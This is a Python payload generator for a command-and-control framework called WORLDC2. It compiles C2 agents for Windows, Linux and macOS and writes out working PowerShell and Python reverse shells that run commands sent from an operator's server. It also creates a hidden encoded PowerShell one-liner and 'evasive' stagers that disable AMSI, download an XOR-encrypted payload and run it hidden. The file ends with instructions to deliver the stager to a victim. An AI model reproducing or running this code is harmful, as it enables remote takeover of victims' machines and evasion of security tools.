#!/usr/bin/env python3
"""
WORLDC2 C2 — Payload Generator
Genera payloads multi-plataforma (Windows, Linux, macOS, PS, Python, C).

Uso:
    python3 payload.py                         # Menú interactivo (IP auto)
    python3 payload.py --os windows            # Windows EXE
    python3 payload.py --os all                # Todas las plataformas
    python3 payload.py --os ps1 --server 10.0.0.5:8443
    python3 payload.py --evasive               # + stagers evasivos
"""

import os, sys, socket, shutil, base64, subprocess, argparse
from pathlib import Path
from datetime import datetime

GREEN="\033[92m";BLUE="\033[94m";YELLOW="\033[93m";RED="\033[91m";CYAN="\033[96m";BOLD="\033[1m";RESET="\033[0m"
PROJECT_ROOT = Path(__file__).parent.parent
OUTPUT_DIR = PROJECT_ROOT / "payloads"
OUTPUT_DIR.mkdir(exist_ok=True)

def find_go():
    """Locate the Go toolchain: PATH first, then the standard system install dir.

    No personal/hardcoded user paths: anything outside the PATH and the
    official /usr/local/go install location is intentionally not consulted.
    """
    go_bin = shutil.which("go")
    if go_bin:
        return go_bin
    system_go = Path("/usr/local/go/bin/go")
    if system_go.exists():
        return str(system_go)
    return None

def build_go_docker(goos, goarch, output, server=""):
    """Build Go payload using Docker when Go is not installed locally."""
    if not shutil.which("docker"):
        print(f"{RED}[✗]{RESET} Docker not found in PATH — cannot build without a local Go toolchain.")
        return None
    print(f"{BLUE}[>]{RESET} Building via Docker {goos}/{goarch}...")
    if server:
        print(f"   {CYAN}Baked-in C2:{RESET} {server}")
    ldflags = "-s -w"
    if server:
        ldflags += f" -X 'main.DefaultServer={server}'"
    out_name = output.name
    cmd = [
        "docker", "run", "--rm",
        "-v", f"{PROJECT_ROOT}:/src",
        "-w", "/src/src/go",
        "golang:1.26-alpine",
        "sh", "-c",
        f"GOOS={goos} GOARCH={goarch} CGO_ENABLED=0 go build -ldflags='{ldflags}' -o /tmp/worldc2-out ./cmd/agent/main.go"
    ]
    result = subprocess.run(cmd, capture_output=True, text=True)
    if result.returncode != 0:
        print(f"{RED}[✗]{RESET} Docker build failed: {result.stderr[:200]}")
        return None
    # Copy from container - use docker cp approach
    # Actually, let's use a volume mount that maps to payloads
    payloads_dir = PROJECT_ROOT / "payloads"
    cmd2 = [
        "docker", "run", "--rm",
        "-v", f"{PROJECT_ROOT}/src/go:/app",
        "-v", f"{payloads_dir}:/out",
        "-w", "/app",
        "golang:1.26-alpine",
        "sh", "-c",
        f"GOOS={goos} GOARCH={goarch} CGO_ENABLED=0 go build -ldflags='{ldflags}' -o /out/{out_name} ./cmd/agent/main.go"
    ]
    result2 = subprocess.run(cmd2, capture_output=True, text=True)
    if result2.returncode == 0 and output.exists():
        size = output.stat().st_size
        print(f"{GREEN}[✓]{RESET} {output.name} ({size/1024/1024:.1f} MB) [via Docker]")
        return output
    else:
        print(f"{RED}[✗]{RESET} Docker build failed: {result2.stderr[:200]}")
        return None

def get_local_ip():
    try:
        s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
        s.connect(("8.8.8.8",80));ip=s.getsockname()[0];s.close();return ip
    except OSError as e:
        print(f"{YELLOW}[!]{RESET} IP auto-detect failed ({e}); using 127.0.0.1")
        return "127.0.0.1"

def banner():
    print(f"""{BOLD}{CYAN}
   ╔══════════════════════════════════════════════╗
   ║          WORLDC2 Payload Generator               ║
   ╚══════════════════════════════════════════════╝
{RESET}""")

def build_go_payload(goos, goarch, output, server="", suffix="", obfuscate=False):
    go_bin = find_go()
    if not go_bin:
        # Fallback to Docker (if available), otherwise fail with a clear message
        if shutil.which("docker"):
            return build_go_docker(goos, goarch, output, server)
        print(f"{RED}[✗]{RESET} Go toolchain not found in PATH and Docker not available.")
        print(f"{YELLOW}[!]{RESET} Install Go (https://go.dev/doc/install) or Docker to build payloads.")
        return None
    agent_dir = PROJECT_ROOT/"src"/"go"/"cmd"/"agent"
    if not (agent_dir/"main.go").exists(): return None
    print(f"{BLUE}[>]{RESET} Cross-compiling {goos}/{goarch}...")
    if server:
        print(f"   {CYAN}Baked-in C2:{RESET} {server}")
    os.chdir(PROJECT_ROOT/"src"/"go")
    env = {**os.environ,"GOOS":goos,"GOARCH":goarch,"CGO_ENABLED":"0"}
    ldflags = "-s -w"
    if server:
        ldflags += f" -X 'main.DefaultServer={server}'"
    cmd = [go_bin,"build",f"-ldflags={ldflags}","-o",str(output),str(agent_dir/"main.go")]
    result = subprocess.run(cmd,env=env,capture_output=True,text=True)
    os.chdir(PROJECT_ROOT)
    if result.returncode==0:
        size=output.stat().st_size
        print(f"{GREEN}[✓]{RESET} {output.name} ({size/1024/1024:.1f} MB)")
        return output
    else:
        print(f"{RED}[✗]{RESET} {result.stderr[:200]}")
        return None

def generate_exe(server, name=None):
    out = OUTPUT_DIR/(name or f"worldc2-windows-{datetime.now():%Y%m%d_%H%M}.exe")
    return build_go_payload("windows","amd64",out,server)

def generate_elf(server, name=None):
    out = OUTPUT_DIR/(name or f"worldc2-linux-{datetime.now():%Y%m%d_%H%M}")
    return build_go_payload("linux","amd64",out,server)

def generate_macho(server, arch="amd64", name=None):
    out = OUTPUT_DIR/(name or f"worldc2-darwin-{arch}-{datetime.now():%Y%m%d_%H%M}")
    return build_go_payload("darwin",arch,out,server)

def generate_ps1(server, name=None):
    out = OUTPUT_DIR/(name or f"worldc2-{datetime.now():%Y%m%d_%H%M}.ps1")
    host,_,port = server.partition(":") if ":" in server else (server,"","8443")
    code=f'''# WORLDC2 PowerShell Agent
$s="{host}";$p={port or 8443}
$c=New-Object Net.Sockets.TcpClient($s,$p)
$t=$c.GetStream();$r=New-Object IO.StreamReader($t);$w=New-Object IO.StreamWriter($t)
$w.AutoFlush=$true
while($c.Connected){{
    try{{
        $cmd=$r.ReadLine()
        if($cmd-eq"kill"){{break}}
        $o=try{{Invoke-Expression $cmd 2>&1|Out-String}}catch{{$_}}
        $w.WriteLine($o)
    }}catch{{break}}
}}
$c.Close()
'''
    out.write_text(code)
    b64 = base64.b64encode(code.encode("utf-16-le")).decode()
    oneliner = f"powershell -exec bypass -w hidden -enc {b64}"
    (OUTPUT_DIR/(out.name+".oneliner.txt")).write_text(oneliner)
    print(f"{GREEN}[✓]{RESET} PS1: {out.name} ({len(code)} B)")
    print(f"{GREEN}[✓]{RESET} One-liner: {out.name}.oneliner.txt")
    print(f"{CYAN}   {oneliner[:120]}...{RESET}")
    return out

def generate_python(server, name=None):
    out = OUTPUT_DIR/(name or f"worldc2-{datetime.now():%Y%m%d_%H%M}.py")
    host, port = server.rsplit(":", 1) if ":" in server else (server, "8443")
    code=f'''import socket,subprocess,os,time
H,P="{host}",{port}
while 1:
 try:
  s=socket.create_connection((H,P),30)
  while 1:
   c=s.recv(4096).decode().strip()
   if c=="kill":s.close();exit()
   r=subprocess.check_output(c,shell=True,stderr=subprocess.STDOUT,timeout=30)
   s.sendall(r)
 except:time.sleep(5)
'''
    out.write_text(code)
    print(f"{GREEN}[✓]{RESET} Python: {out.name} ({len(code)} B)")
    return out

def generate_c(server, name=None):
    out = OUTPUT_DIR/(name or f"worldc2-{datetime.now():%Y%m%d_%H%M}.c")
    src = PROJECT_ROOT/"src"/"agents"/"c"/"agent.c"
    if src.exists():
        shutil.copy(src,out)
        print(f"{GREEN}[✓]{RESET} C: {out.name}")
        print(f"{YELLOW}[!]{RESET} Compile: gcc -O2 -s -o agent {out.name} && ./agent {server}")
    else:
        print(f"{RED}[✗]{RESET} C source not found")
    return out

def generate_evasive(server):
    # Parse host:port correctly
    if ":" in server:
        host, port = server.rsplit(":", 1)
    else:
        host, port = server, "8443"
    server_url = f"http://{host}:8000/payload.enc"
    key = os.urandom(32); kh = key.hex()
    print(f"\n{YELLOW}{BOLD}[EVASIVE]{RESET} Key: {kh[:16]}...")
    payload=None
    for f in sorted(OUTPUT_DIR.glob("worldc2-linux-*"),key=lambda x:x.stat().st_mtime,reverse=True):
        if f.is_file() and f.suffix=="": payload=f; break
    if payload is None:
        print(f"{RED}[✗]{RESET} No Linux payload found in payloads/ (expected worldc2-linux-*).")
        print(f"{YELLOW}[!]{RESET} Build it first (e.g. python3 payload.py --os linux) — stagers not generated.")
        return
    d=bytearray(payload.read_bytes())
    for i in range(len(d)): d[i]^=key[i%32]
    (OUTPUT_DIR/"payload.enc").write_bytes(d)
    print(f"{GREEN}[✓]{RESET} payload.enc ({len(d)} bytes)")
    stagers={
        "ps1":f'''$k=[byte[]]@({','.join(str(b) for b in key)})
$u="{server_url}"
try{{[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)}}catch{{}}
$d=(New-Object Net.WebClient).DownloadData($u)
for($i=0;$i-lt$d.Length;$i++){{$d[$i]=$d[$i]-bxor$k[$i%32]}}
$f=[IO.Path]::GetTempFileName()+'.exe';[IO.File]::WriteAllBytes($f,$d)
Start-Process $f -WindowStyle Hidden;Start-Sleep 2;rm $f -Force
''',
        "py":f'''import os,tempfile,subprocess
k=bytes([{','.join(str(b) for b in key)}])
u="{server_url}"
try:d=__import__('urllib.request').urlopen(u).read()
except:d=__import__('urllib2').urlopen(u).read()
d=bytearray(d)
for i in range(len(d)):d[i]^=k[i%32]
p=os.path.join(tempfile.gettempdir(),os.urandom(4).hex())
open(p,'wb').write(d);os.chmod(p,0o755)
subprocess.Popen([p],stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL,start_new_session=True)
''',
        "sh":f'''#!/bin/bash
u="{server_url}"
k=({','.join(str(b) for b in key)})
f=/tmp/.$RANDOM
curl -s "$u" -o "$f" 2>/dev/null||wget -qO "$f" "$u" 2>/dev/null
python3 -c "
d=bytearray(open('$f','rb').read())
k=bytes([{','.join(str(b) for b in key)}])
for i in range(len(d)):d[i]^=k[i%32]
open('$f','wb').write(d)
" 2>/dev/null
chmod +x "$f" 2>/dev/null;nohup "$f" &>/dev/null &
''',
    }
    for n,c in stagers.items():
        p=OUTPUT_DIR/f"stager-{n}.{n}"
        p.write_text(c)
        print(f"{GREEN}[✓]{RESET} stager-{n}: {p.name} ({len(c)} B)")
    print(f"\n{RED}{BOLD}[DELIVERY]{RESET} cd payloads/ && python3 -m http.server 8000")
    print(f"{RED}{BOLD}[DELIVERY]{RESET} Deliver stager (not payload) to victim")

def interactive_menu():
    banner()
    # Check build tools
    go_bin = find_go()
    has_docker = shutil.which("docker") is not None
    if not go_bin and not has_docker:
        print(f"{RED}[✗]{RESET} Neither Go nor Docker found. Install one to build payloads.")
        print(f"{YELLOW}[!]{RESET} Install Go: https://go.dev/doc/install")
        print(f"{YELLOW}[!]{RESET} Or install Docker: https://docs.docker.com/engine/install/")
        sys.exit(1)
    if not go_bin:
        print(f"{YELLOW}[!]{RESET} Go not found locally — will use Docker for compilation")
    lip = get_local_ip()
    default = f"{lip}:8443"
    server = input(f"{BOLD}Server [IP:port]{RESET} [{default}]: ").strip() or default
    # Normalize: append default port if missing
    if ":" not in server:
        server = f"{server}:8443"
    print(f"""
{BOLD}Platform:{RESET}
  1 Windows EXE     2 Linux ELF     3 macOS
  4 PowerShell      5 Python        6 C source
  7 ALL             8 + Evasive
""")
    c = input(f"{BOLD}Select [1-8]:{RESET} ").strip()
    if c=="1": generate_exe(server)
    elif c=="2": generate_elf(server)
    elif c=="3": generate_macho(server);generate_macho(server,"arm64")
    elif c=="4": generate_ps1(server)
    elif c=="5": generate_python(server)
    elif c=="6": generate_c(server)
    elif c=="7":
        generate_exe(server);generate_elf(server)
        generate_macho(server);generate_macho(server,"arm64")
        generate_ps1(server);generate_python(server);generate_c(server)
    elif c=="8":
        generate_exe(server);generate_elf(server)
        generate_macho(server);generate_macho(server,"arm64")
        generate_ps1(server);generate_python(server);generate_c(server)
        generate_evasive(server)
    print(f"\n{GREEN}{BOLD}Done!{RESET} → payloads/")

def main():
    p=argparse.ArgumentParser(description="WORLDC2 Payload Generator")
    p.add_argument("--os",choices=["windows","linux","darwin","all","ps1","python","c"])
    p.add_argument("--server",default=None,help="C2 address (auto-detect)")
    p.add_argument("--output",help="Output filename")
    p.add_argument("--evasive",action="store_true",help="+ evasive stagers")
    p.add_argument("--list",action="store_true",help="List payloads")
    args=p.parse_args()

    if args.list:
        for f in sorted(OUTPUT_DIR.glob("*"),key=lambda x:x.stat().st_mtime,reverse=True):
            if f.is_file():
                s=f.stat().st_size;u="MB" if s>1e6 else "KB" if s>1e3 else "B"
                print(f"  {f.name:<40} {s/(1e6 if u=='MB' else 1e3 if u=='KB' else 1):.1f} {u}")
        return

    if not args.os:
        interactive_menu()
        return

    banner()
    server = args.server or f"{get_local_ip()}:8443"
    if ":" not in server:
        server = f"{server}:8443"
    print(f"{BOLD}Target:{RESET} {GREEN}{server}{RESET}\n")

    # With --os all a single --output name would be overwritten by every
    # platform build: derive per-OS suffixed names instead.
    def out_for(os_tag):
        """Output name for one platform: per-OS suffixed when --os all + --output,
        the requested --output otherwise (None → generator's default name)."""
        if args.os != "all":
            return args.output
        if not args.output:
            return None  # default names already carry the platform suffix
        stem = Path(args.output).stem
        ext = Path(args.output).suffix
        if os_tag == "windows":
            return str(OUTPUT_DIR / f"{stem}-windows{ext or '.exe'}")
        if os_tag == "linux":
            return str(OUTPUT_DIR / f"{stem}-linux{ext}")
        if os_tag.startswith("darwin"):
            return str(OUTPUT_DIR / f"{stem}-{os_tag}{ext}")
        if os_tag == "ps1":
            return str(OUTPUT_DIR / f"{stem}-ps1.ps1")
        if os_tag == "python":
            return str(OUTPUT_DIR / f"{stem}-python.py")
        return None

    if args.os == "all" and args.output:
        print(f"{YELLOW}[!]{RESET} --os all: a single --output would be overwritten "
              f"per platform; using '{Path(args.output).stem}-<os>' names instead")

    if args.os in ("windows","all"): generate_exe(server, out_for("windows"))
    if args.os in ("linux","all"): generate_elf(server, out_for("linux"))
    if args.os in ("darwin","all"):
        generate_macho(server,"amd64",out_for("darwin-amd64"))
        generate_macho(server,"arm64",out_for("darwin-arm64"))
    if args.os in ("ps1","all"): generate_ps1(server, out_for("ps1"))
    if args.os in ("python","all"): generate_python(server, out_for("python"))
    if args.os == "c": generate_c(server,args.output)
    if args.evasive: generate_evasive(server)

if __name__=="__main__":
    main()
